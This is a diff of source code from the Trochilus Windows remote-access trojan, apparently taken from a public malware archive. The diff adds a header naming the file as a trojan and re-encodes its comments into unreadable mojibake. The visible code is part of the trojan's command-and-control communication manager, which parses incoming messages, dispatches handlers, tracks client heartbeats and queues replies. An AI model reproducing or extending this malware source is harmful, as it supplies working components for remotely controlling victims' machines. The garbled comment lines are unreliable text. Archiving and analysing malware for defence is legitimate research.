@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <Winsock2.h>
 #include "file/MyFile.h"
@@ -542,7 +553,7 @@ BOOL CommManager::HandleMessage( SOCKADDR_IN fromAddr, const LPBYTE pData, DWORD
 
 	BOOL ret = recvCommdata.Parse(dataBuffer, dataBuffer.Size());
 
-	//½âÎöÊý¾Ý
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	if ( ret )
 	{
 		debugLog(_T("recv msg msgid[%I64u] serial[%I64u]"), recvCommdata.GetMsgID(), recvCommdata.GetSerialID());
@@ -550,7 +561,7 @@ BOOL CommManager::HandleMessage( SOCKADDR_IN fromAddr, const LPBYTE pData, DWORD
 		SetMessageToAnswer(recvCommdata);
 		HandleMsgByMsgHandler(recvCommdata.GetMsgID(), recvCommdata);
 
-		//¸üÐÂÐÄÌøÊý¾Ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		clientid = recvCommdata.GetClientID();
 
 		UpdateHeartbeat(clientid.c_str(), fromAddr);
@@ -580,7 +591,7 @@ BOOL CommManager::HandleMessageAndReply( SOCKADDR_IN fromAddr, const LPBYTE pDat
 		return FALSE;
 	}
 
-	//ÕÒµ½ÐèÒª·¢ËÍµÄÏûÏ¢
+	//ï¿½Òµï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½Íµï¿½ï¿½ï¿½Ï¢
 	ByteBuffer toSendData;
 
 	m_cspd.Enter();
